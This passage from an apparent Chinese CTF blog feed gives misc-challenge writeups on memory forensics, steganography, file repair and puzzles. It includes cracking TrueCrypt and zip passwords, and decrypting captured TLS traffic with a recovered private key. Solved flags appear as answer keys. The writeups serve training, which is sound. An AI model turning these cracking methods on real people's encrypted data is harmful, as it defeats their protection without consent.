class="string">;x=0.5906565476132922,y=-1.4103866887242276\</span></span><br><span class="line"><span class="string">;x=0.8171334469097077,y=-1.748680676187232\</span></span><br><span class="line"><span class="string">;x=0.668796106230006,y=-1.5411754553626387\</span></span><br><span class="line"><span class="string">;x=0.581250276261842,y=-1.395451210048179"</span></span><br><span class="line"></span><br><span class="line">data_list = data.split(<span class="string">";"</span>)</span><br><span class="line">x = []</span><br><span class="line">y = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data_list:</span><br><span class="line">    i_list = str(i).split(<span class="string">','</span>)</span><br><span class="line">    x.append(float(i_list[<span class="number">0</span>][<span class="number">2</span>:]))</span><br><span class="line">    y.append(float(i_list[<span class="number">1</span>][<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line">x = np.array(x)</span><br><span class="line">y = np.array(y)</span><br><span class="line"></span><br><span class="line">y_fit=np.polyfit(x,y,<span class="number">4</span>)<span class="comment">#二次多项式拟合</span></span><br><span class="line">y_show=np.poly1d(y_fit)<span class="comment">#函数优美的形式</span></span><br><span class="line">print(y_show)<span class="comment">#打印</span></span><br><span class="line">y1=f_fit(x,y_fit)</span><br><span class="line">plt.plot(x,f(x),<span class="string">'r'</span>,label=<span class="string">'original'</span>)</span><br><span class="line">plt.scatter(x,y,c=<span class="string">'g'</span>,label=<span class="string">'before_fitting'</span>)<span class="comment">#散点图</span></span><br><span class="line">plt.plot(x,y1,<span class="string">'b--'</span>,label=<span class="string">'fitting'</span>)</span><br><span class="line">plt.title(<span class="string">'polyfitting'</span>)</span><br><span class="line">plt.xlabel(<span class="string">'x'</span>)</span><br><span class="line">plt.ylabel(<span class="string">'y'</span>)</span><br><span class="line">plt.legend()<span class="comment">#显示标签</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>然后去用得到的函数式推测十个y值，得到flag（如下图）：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-ML2.png" alt="VN-ML2.png"></p><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><p>检查镜像信息，然后终端进程文件查看一条龙。<br>终端没有发现什么有用的，进程直接浏览器记事本画图磁盘加密四个emmm，文件查看什么都没有。<br>一开始想用notepad查看记事本内容，然后发现不支持。无奈-h查看帮助，看了半天找到一个editbox，可以查看编辑器的内容，于是成功获得百度云分享链接内容：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-%E5%86%85%E5%AD%981.png" alt="VN-内存1.png"><br>拿到一个VOL，很明显这应该就是加密的磁盘文件，将Truecrypt进程dump下来，用efdd工具破解密码挂载到本地，获取到key：uOjFdKu1jsbWI8N51jsbWI8N5。<br>至此四个进程用去三个，很明显最后的提示信息应该就在画图进程里。<br>将mspaint进程dump出来，用gimp分析，宽1728，偏移2kw时，得到：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-%E5%86%85%E5%AD%982.png" alt="VN-内存2.png"><br><del>好了，剩下的真不行了，图像信息只分析出来这一个，不知道这个字符串怎么和key用，推测是一种加密，但没找到别的提示信息，搞不定了emmmmm</del><br>套娃可耻！！！到网上下载一个TrueCrypt，用它挂载VOL，密码就是刚刚的key，然后拿到压缩包，密码是上面的画图的内容，开头那个是‘1’，一开始以为是I，然后不对就试了下‘l’和‘1’，出了flag</p><h2 id="Final-Game"><a href="#Final-Game" class="headerlink" title="Final Game"></a>Final Game</h2><h3 id="Malebolge-Online"><a href="#Malebolge-Online" class="headerlink" title="Malebolge Online"></a>Malebolge Online</h3><p>题目有一个压缩包和一个vmdk，先看看压缩包，里面有个文本，说是一些有用的东西，看来是解题提示，但是加密了，旁边还有注释。说要去要去地狱的第八层emmm<br>发现加密文本的文件名也是地狱的英文单词，谷歌一下看看是不是有猫腻。这里有一说一运气了一下。<br>直接搜索这个单词只能搜出来相关的宗教知识，不过因为我懒得手打，就<code>f2</code> 文件，然后 <code>ctrl a</code> <code>ctrl c</code> 了，于是我谷歌的是这个单词后面跟了 <code>.txt</code> 的后缀，直接就搜出来一个 Malebolge online ，打开发现也是一种类似 <code>brain fuck</code> 的语言，很明显，注释里面的内容拉进来运行，得到一串字符串，这应该就是解压密码了。<br>然后解压缩成功，打开文本查看提示：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG1.png" alt="VN-FG1.png"><br>很明显，这些就是解题相关的文件。接下来该去看vmdk了。</p><h3 id="vmdk-find-file"><a href="#vmdk-find-file" class="headerlink" title="vmdk find file"></a>vmdk find file</h3><p>7z打开vmdk，发现这真就把c盘弄下来小半emmm，听人说里面有lamber师傅的照片，本来准备直接拿相关文件的手控制不住的就一个个文件夹的点过去找照片了2333。<br>咳咳，说正经的说正经的。这里直接用修改时间排序查看最后修改的文件夹，一般和题目相关的文件都是最后修改或者访问的，毕竟出完题要先测试一下复现。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG2.png" alt="VN-FG2.png"><br>这里有个坑，只看修改时间和访问时间会发现只有它是放题的地方，但是如果进入到下面的 <code>user</code> 文件夹下的 <code>lenovo</code> 会发现外面看修改和访问都是11月1日，进去之后反而有6号和7号的，还好我为了找某人的照片专门跑过来看了2333<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG3.png" alt="VN-FG3.png"><br>所有放题目文件的位置都找到了，一一把题目文件提取出来。</p><h3 id="NTFS-ELF"><a href="#NTFS-ELF" class="headerlink" title="NTFS + ELF"></a>NTFS + ELF</h3><p>发现各个文件不是结构有问题就是有密码，这时想到提示说有ntfs，就用工具扫了一下，发现 <code>door.png</code> 后面藏了一个exe，运行一下他说要<strong>放在炼狱下运行</strong>。又提示 Mr.png才能上天堂，这里我一开始以为是有什么png图片需要拿过来，但是找了半天找不到别的啥图片555，然后干脆去逆向分析这个exe。<br>于是乎，一个下午没了，这程序保护全开上的强壳，吐了。后来突然想到是不是把别的题目文件和它放一起就行了，就把别的文件拉了过来。ok，拿到提示：需要修复elf。</p><p><del>这里又是几个小时各种查elf修复emmm。被自己蠢哭，这是misc不是re！！！</del></p><p>按照misc的文件修复思路走那坑定是个别固定的文件十六进制数据被修改了，于是直接搜索elf的文件格式，发现文件开头应该是 <code>7f</code> 的被改了，改回来。然后试了下用kali运行，发现报错，可能是改了别的地方，这里百度到可以用Linux下的 <code>readelf -h filename</code> 查看elf文件的结构信息，发现elf类型是none，猜测是这里错了。这里我用了 <code>010 Editor</code> 的模板功能，这玩意真好用，直接一键选择类型。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG4.png" alt="VN-FG4.png"><br>然后运行程序：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG5.png" alt="VN-FG5.png"><br>emmm，还是ida看一下吧。箭头指向的应该是main函数地址。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG6.png" alt="VN-FG6.png"><br>分析main函数，发现这里进行了一次判断，如果向程序传参的值大于1，则跳过该处。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG7.png" alt="VN-FG7.png"><br>传一个参数 2 运行试试：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG8.png" alt="VN-FG8.png"><br>得到提示，很明显是让我们解md5，在线网站跑一下，得到 <code>evoA</code><br>这里我没分析出来v4的值受什么影响，不过看到这个evoA，我猜测<code>v4[1]</code>是传入参数的字符长度，那么接下来把evoA作为参数传入。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG9.png" alt="VN-FG9.png"><br>得到一串字符，开头是pdf，应该是pdf的密码。去查看pdf内容。</p><h3 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h3><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG10.png" alt="VN-FG10.png"><br>键盘密码，看着键盘转换一下，根据明文内容可知表情符号是空格。得到：</p><pre><code>The password of word is capital(PROVERBS OF GOD)</code></pre><h3 id="Word"><a href="#Word" class="headerlink" title="Word"></a>Word</h3><p>拿到word压缩包的密码，去查看word，打开发现是一个图片的十六进制，因为字符太多，这里我用脚本转了，python的python-docx库可以操作docx，先把docm格式另存为docx格式，提示有宏，先看一下宏的内容<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG11.png" alt="VN-FG11.png"><br>是一堆base64，写个脚本解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 考虑到base64隐写，先解一下base64，这里有个不算坑的坑，宏生成的文本换行只有一个\r，没有\n，所以python会把其当作一行</span></span><br><span class="line">b64chars = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'ba.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">''</span></span><br><span class="line">    flag = <span class="string">''</span></span><br><span class="line">    lines = f.readline().split(<span class="string">'\r'</span>)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        stegb64 = str(line).replace(<span class="string">"\r"</span>,<span class="string">"\n"</span>).strip(<span class="string">"\n"</span>)</span><br><span class="line">        rowb64 =  str(base64.b64encode(base64.b64decode(stegb64))).strip(<span class="string">"\n"</span>)</span><br><span class="line">        offset = abs(b64chars.index(stegb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]) - b64chars.index(rowb64.replace(<span class="string">'='</span>,<span class="string">''</span>)[<span class="number">-1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">'='</span>) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += bin(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">                <span class="comment">#flag += chr(int(bin(offset)[2:].zfill(equalnum * 2), 2))</span></span><br><span class="line">                <span class="comment">#print(flag) #这样写得不出正确结果</span></span><br><span class="line">    print(<span class="string">''</span>.join([chr(int(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(bin_str), <span class="number">8</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#这里是正常解文本base64</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'ba.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> fi,open(<span class="string">'ba_de'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> io:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> fi.readlines():</span><br><span class="line">                <span class="comment">#print(type(i.strip()))</span></span><br><span class="line">                io.write(base64.b64decode(i.strip()))</span><br><span class="line">        shutil.copy(<span class="string">'ba_de'</span>,<span class="string">'ba_de.tmp'</span>)</span><br><span class="line">        os.remove(<span class="string">'ba.txt'</span>)</span><br><span class="line">        os.rename(<span class="string">'ba_de'</span>,<span class="string">'ba.txt'</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">'finish'</span>)</span><br></pre></td></tr></table></figure><p>运行发现base64藏了东西。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG12.png" alt="VN-FG12.png"></p><p>然后再去查看十六进制转换出来的文件，是一个被修改了文件头的png，改回来，stegslove发现存在lsb隐写，推测是带密码的lsb，用GitHub上的cloacked-pixel解，上面的base64隐写内容为密钥<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG13.png" alt="VN-FG13.png"><br>得到最后osz文件压缩包的密码。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG14.png" alt="VN-FG14.png"></p><h3 id="OSZ"><a href="#OSZ" class="headerlink" title="OSZ"></a>OSZ</h3><p>这里我以前没玩过osu，所以就按照正常流程走。<br><em>其实玩过的大佬直接还是要正常走下去23333</em><br>拖进kali里面发现直接变成了压缩包图标的文件，解压缩得到一个文件夹<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG15.png" alt="VN-FG15.png"></p><p>进去看看：   一堆音频和一个<code>Read.jpg</code>加一个<code>osu</code>后缀的疑似文本的文件.<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG16.png" alt="VN-FG16.png"></p><p>文本打开osu后缀的文件，顺便strings看一下<code>Readme.jpg</code>。<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG17.png" alt="VN-FG17.png"></p><p>jpg结尾跟的有东西，osu后缀给了一个b站av号。先查看这个av号的视频。发现是一个叫<code>osu</code>的音频相关的编辑器，搜一下，知道是一种音游，比节奏大师要难很多emmm。下载<code>osu!</code>，将<code>paradise.osz</code>用<code>osu!</code>打开，然后没发现什么问题，不过大概了解一下玩法，推荐看到的各位入手嘿嘿嘿。再去看看jpg后面的内容：</p><pre><code>in,map.flag,is :0036112S0038362y0042112c0055162{011091201187120135512014211201581630200412020386202163120219762022531202313120251862030251203121120318412032962803424120352837035853704093370420137044346204471370450062045786205147370514737051586205165370525312052606205301870548562}Traversing.Time</code></pre><p>在map里，flag是xxxxxxx，结合它的玩法和群里师傅的说法，看来是让我画flag了emmmm，把字符<code>Syc{</code>前的数字当成时间，进入地图编辑器里查看相关时间的内容发现</p><p><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG18.png" alt="VN-FG18.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG19.png" alt="VN-FG19.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG20.png" alt="VN-FG20.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesVN-FG21.png" alt="VN-FG21.png"></p><p>果然是看图像拼flag，这里就跟着时间节点一个个记录flag数值即可。<br>在记录一下拼flag时遇到的小坑：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200303184416.png" alt="20200303184416.png"><br>这几个选择全部关掉！！！不然后面有几个字符显示的部分不全认不出来是什么emmm，还有下面这里，一开始我记录flag的时候有好几个都是这样给了一个点，给我整蒙了，后来意识到这点上有数字，这个数字就是flag的值emmm，剩下的就是看形状了，反正md5的字符是十六进制的字符，实在顶不准就标记一下手工爆破吧，这里实在不想再回去一个个复查了555<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages20200303184637.png" alt="20200303184637.png">))</p>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Misc" scheme="http://xibai.xyz/categories/Misc/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
      <category term="Misc" scheme="http://xibai.xyz/tags/Misc/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF-MISC(三)</title>
    <link href="http://xibai.xyz/2020/02/24/BUU-Misc-three/"/>
    <id>http://xibai.xyz/2020/02/24/BUU-Misc-three/</id>
    <published>2020-02-24T15:51:11.000Z</published>
    <updated>2020-03-30T04:24:17.704Z</updated>
    
    <content type="html"><![CDATA[<p><strong>最近更新：</strong> <em>2020-03-11 21:45</em></p><h2 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h2><p>第一层压缩包密码直接爆破，第二次是伪加密，第三层根据 <code>sh</code> 的命令可知密钥是压缩包创建时的时间戳，查看压缩包修改日期，在线工具看一下那一天的时间戳，时间戳其实就是一个距离那个一九几几年几月几日零时零分零秒的秒数，同一天的时间戳前几位肯定一样，又因为其所使用python的相关时间戳函数范围的值精确到了小数点后两位，所以这里使用掩码攻击爆破密钥<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages%E6%97%B6%E9%97%B4%E6%88%B31.png" alt="时间戳1.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimages%E6%97%B6%E9%97%B4%E6%88%B32.png" alt="时间戳2.png"></p><h2 id="GUET-CTF2019-KO"><a href="#GUET-CTF2019-KO" class="headerlink" title="[GUET-CTF2019]KO"></a>[GUET-CTF2019]KO</h2><p>就是<code>ook</code>编码的签到，找个在线解码网站解一下码就行了</p><h2 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h2><p>题目说是和汉字里程碑的两种编码方式。首先就想到了可能和汉字输入法有关，肯定不是拼音输入，于是想到五笔输入，很明显纯四位数字和五笔没有关系，试试下面的字母，果然拿到了半句连贯的话。上面的四位数字找了好久才找到是上世纪的电报码，我天，太狗了。电报码翻译过来是人工智能。连起来求md5即为flag</p><h2 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h2><p>打开之后发现就是50分的签到类的题，觉得应该不会有什么太大的坑。然而这里是我蒙出来的我特喵，瞎猜真的很难猜的，希望以后能少一点瞎猜，多一丝对吹头发选手的关爱TAT<br>因为是50分的题，又发现这是一列十六进制的值，关键是都在<code>80</code>到<code>ff</code>之间，就盲猜是原字符的ASCII码值加了128，写个脚本就出来了</p><p>  That was fast! The flag is: DDCTF{922ab9974a47cd322cf43b50610faea5}</p><h2 id="GWCTF2019-huyao"><a href="#GWCTF2019-huyao" class="headerlink" title="[GWCTF2019]huyao"></a>[GWCTF2019]huyao</h2><p>两个一样的图片，不过大小差了大概十几kb，目测是盲水印，去GitHub找一下盲水印的脚本，跑一下即可，另外，GitHub上面有两种不兼容版本的盲水印，一般用这个版本写入的水印只能用这个版本提取。</p><h2 id="HBNIS2018-excel破解"><a href="#HBNIS2018-excel破解" class="headerlink" title="[HBNIS2018]excel破解"></a>[HBNIS2018]excel破解</h2><p>我尽力破解密码了，但着实爆不出来。不过这题有另外的不知道是不是非预期解，winhex搜索或者strings命令都能直接看到flag</p><h2 id="voip"><a href="#voip" class="headerlink" title="voip"></a>voip</h2><p>百度voip，学到这是网络电话用的协议，那这个流量包很明显就是捕获的一次在线通话，wireshark中有相关分析功能，如下：<br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesRTP2.png" alt="RTP2.png"><br><img src="https://gitee.com/ye_xi_bai/blogimage/raw/master/blogimagesRTP3.png" alt="RTP3.png"></p><p>经过本废喵十分钟的努力，终于记下了整个通话内容的全部单词。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi,this is your service.Please press one to listen flag.The flag is S E C C O N,hold on,please.9 0 0 1 I V R close race only capital letter for you.NO,thanks.</span><br></pre></td></tr></table></figure><p>后来百度知道这是secconctf，我一开始以为flag是flag{SECCON9001IVR}，丢，原来是SECCON{9001IVR}emmm</p><h2 id="GUET-CTF2019-虚假的压缩包"><a href="#GUET-CTF2019-虚假的压缩包" class="headerlink" title="[GUET-CTF2019]虚假的压缩包"></a>[GUET-CTF2019]虚假的压缩包</h2><p>题目给了两个压缩包，虚假的那个明显是伪加密的意思，遇压缩包不觉先上7z，伪加密的压缩包7z可以直接解压缩并告知压缩包数据头部信息有错，这个错误直接忽略就可。得到 <code>key.txt</code> ，里面的内容明显是让解一个简单的<code>rsa</code>计算，<code>n=33</code>，<code>e=3</code>，这和直接说 <code>d=7</code> 有啥区别，不如放一个稍微花里胡哨点的解密好玩2333。真实的压缩包的密码脑洞了一下下，不过只是一下下，还在正常范围之内。txt最后的那句话加上答案才是完整密码————<strong>答案是5</strong>.解密是一张图片和不知道是啥的文件，这里因为开了kali想用<code>file</code>命令查看那个未知文件是不是已知文件类型，结果发现图片在卡里下无法显示，故winhex修改高度看到提示 <code>^5</code> ，那就写个脚本和5异或咯。<br><del>这里犯了个小错，一开始直接把文件的十六进制数据和5异或了，然后发现得到的结果有问题，后来仔细看了看，出题人已经把文件的十六进制encode一次了，直接用读取用int转一下数据类型就可以了</del></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'cipher'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> io,open(<span class="string">'flag'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> fi:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        tmp = io.read(<span class="number">128</span>)</span><br><span class="line">        print(tmp)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="string">''</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        flag = <span class="string">''</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> tmp:</span><br><span class="line">            flag += str(hex(int(i,<span class="number">16</span>)^<span class="number">5</span>)[<span class="number">2</span>:])</span><br><span class="line">        print(len(flag))</span><br><span class="line">        fi.write(binascii.a2b_hex(flag.strip()))</span><br></pre></td></tr></table></figure><p>然后winhex打开生成的文件看到开头又PK和xml的字符，推测是office的文件，先试试word文档打开，发现显示正常，结尾有多余的空格和换行，估计是白色字体，全选之后改一下字体颜色看到flag。<br><img src="http://lychee.xibai.xyz/uploads/big/7503f8658073cff565bf143961da9179.png" alt="xml"></p><h2 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h2><p>这是少儿编程logo语言，在网上找了好几个版本的解释器都不能完全识别文本的所有命令，最后在google上的一个在线工具中完整执行。。。再次验证在线工具一般情况比离线工具强的莫名理论emmmm</p><h2 id="greatescape"><a href="#greatescape" class="headerlink" title="greatescape"></a>greatescape</h2><p>这个题让我深感只会基操就来硬刚wireshark的难受。以后有空了认真拿着wireshark的教学手册修炼一波，一条一条流量硬刚的日子再也不想过了555.<br>首先查看流量协议类型发现存在<code>ftp</code>和<code>smtp</code>两种关键流量，前者一般人都知道是访问服务器文件的，后者略微冷一点点，不过大家玩信安的也应该有了解过，大概就是是邮件通信服务的协议类型。<br>分析两种流量的内容，在<code>ftp</code>流量中发现一个文件<code>ssc.key</code>，查看<code>stmp</code>中的邮件内容，得到关键信息：<br><img src="http://lychee.xibai.xyz/uploads/small/20c1fb4142fa45e68c9ee89c4621a089.png" alt="stmp"><br>他会通过<code>https://ssc.teaser.insomnihack.ch</code>该域名的服务器传输东西，那么很明显了，前面的<code>ssc.key</code>是一个类似于RSA私钥的文件（我打开看了确实是RSA私钥），而这里访问这个<code>SSC</code>的服务器用了<code>SSL</code>的加密，在 <strong>得到了私钥的情况下就可以为wireshark指定对目标TLS加密流量进行解密</strong> 。通过 编辑-&gt;首选项-&gt;protocol（协议）-&gt;（<strong><em>老版wireshark选择SSL</em></strong>）TLS -&gt;RSA keys list:Edit..,直接添加指定IP、端口、协议、本地RSA私钥文件的信息，然后重新打开该流量包文件即可查看之前一些乱码的目标流量信息。在前面提到的那个<code>SSC</code>相关的所有解密了的流量信息中查找关键信息，一条一条的找着审啊（回头必须学一些进阶操作惹），在<code>tcp.stream eq 80</code>的http流量中发现小旗纸。<br><img src="http://lychee.xibai.xyz/uploads/big/b09d7fb35dd7eb319bea8af22cf86d93.png" alt="flag"></p><h2 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h2><p>一开始没认出来这是音频分析里的图像emmm，后来看着图片开头竖着一列点点，中间横着一条线，才发现这是音频分析的截图。那就好说了，转一手摩斯电码就可，注意莫斯电码结果都是小写</p><h2 id="HBNIS2018-caesar"><a href="#HBNIS2018-caesar" class="headerlink" title="[HBNIS2018]caesar"></a>[HBNIS2018]caesar</h2><p>入门凯撒，偏移一位</p><h2 id="HBNIS2018-低个头"><a href="#HBNIS2018-低个头" class="headerlink" title="[HBNIS2018]低个头"></a>[HBNIS2018]低个头</h2><p>简单键盘密码</p><h2 id="GUET-CTF2019-soul-sipse"><a href="#GUET-CTF2019-soul-sipse" class="headerlink" title="[GUET-CTF2019]soul sipse"></a>[GUET-CTF2019]soul sipse</h2><p>用 <strong>Audacity</strong> 分析，一开始没发现东西，后来想到频谱图里下面有一行红线，猜测内容是被缩小了<br><img src="http://lychee.xibai.xyz/uploads/big/76cb90d64cea4819a299ffb5e0d70c8c.png" alt="red line"><br><img src="http://lychee.xibai.xyz/uploads/small/80cb0e34c72b40f2bd02068dab02af21.png" alt="zoom"><br>啊啊啊，我的眼睛！！！出题人让我逮到了有他好果子吃！<br><img src="http://lychee.xibai.xyz/uploads/small/165b86a4b0504df0e89f50c871a8b9c4.png" alt="hint"><br>两个数字的和，看来这个wav里面藏了其他东西，用wav相关的隐写工具先试一试，发现steghide解出了一个url，是腾讯微云的文件分享，下载下来，png的头部数据还错了，手动修复。<br><img src="http://lychee.xibai.xyz/uploads/small/38a63fd2cd703ade5e0349d981cd8c14.png" alt="flag"><br>转Unicode得到两个数字，相加即为flag</p><h2 id="HDCTF2019-你能发现什么蛛丝马迹吗"><a href="#HDCTF2019-你能发现什么蛛丝马迹吗" class="headerlink" title="[HDCTF2019]你能发现什么蛛丝马迹吗"></a>[HDCTF2019]你能发现什么蛛丝马迹吗</h2><p>volatility分析，这里注意查看镜像信息后直接用第一个<code>Win2003SP0x86</code>来进行其它的分析会出现无法识别各种东西的问题，换后面的镜像即可。<br>查看文件发现存在flag.png，dump出来是一个二维码，扫码拿到一串字符串，base64尝试无果，再次分析该文件发现尾部还有第二个文件。分离后得到<code>key</code>和<code>iv</code>，那应该是对称加密算法的一种，尝试后在<code>aes</code>的<code>ecb</code>模式下解得flag</p><h2 id="CTF2019-otaku"><a href="#CTF2019-otaku" class="headerlink" title="[*CTF2019]otaku"></a>[*CTF2019]otaku</h2><p>u1s1，去年我是怎么被*ctf的签到劝退的，记得当时签到死活提交不对。以为是个神仙比赛，这看来也是有简单题的，tnl555。题目文件是伪加密，解压是一个zip和doc，zip里有一个<code>last words.txt</code>和一段压缩设置的注释，doc里面有一段隐藏文字，很明显隐藏文字就是<code>last words</code>的内容。那应该就是明文攻击了，给了winrar的压缩方式，直接提取lastwords内容压一个包。<br>这里有个点，就是明文攻击要求内部的已知加密文件必须是一模一样的内容，压出来一个一样的包，想看打出来的包符合不符合要求可以用winrar打开看它们的crc校验码是否一样，校验码一样就可以直接攻击，不一样的话要先调整文件，调整到crc码一样才可以。<br>这里一开始打了个包发现crc并不一样，就查找问题，发现题目中的<code>lastwords.txt</code>是432byte，我们提取出来的txt是433byte，说明压缩算法暂时没问题，问题出在我们创建的txt上面了。打开txt查看我们提取的内容，总共是431个字符，但是大小是433byte，说明里面有一个字符不在ASCII码范围，故utf-8用了3个字节表示这个字符，而源文件432byte，应该是这个字符仅用了2byte。那就知道是什么问题了，将txt另存为ANSI或者GBK编码，再看就是432byte了，然后按照给出的压缩方式压缩，crc码一样，明文攻击得到压缩包密码。<br>解压缩得到flag.png，直接常规png隐写一条路，发现lsb隐藏了flag</p><h2 id="日常未完待续嘤嘤嘤QAQ"><a href="#日常未完待续嘤嘤嘤QAQ" class="headerlink" title="日常未完待续嘤嘤嘤QAQ"></a>日常未完待续嘤嘤嘤QAQ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">突然惊醒我早先是学bin的emmm，等我把三写完就去爆肝bin，丢</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        
        
          
        
      
    
    </summary>
    
    
      <category term="Misc" scheme="http://xibai.xyz/categories/Misc/"/>
    
    
      <category term="CTF" scheme="http://xibai.xyz/tags/CTF/"/>
    
      <category term="Writeup" scheme="http://xibai.xyz/tags/Writeup/"/>
    
      <category term="Misc" scheme="http://xibai.xyz/tags/Misc/"/>
    
  </entry>
  
</feed>
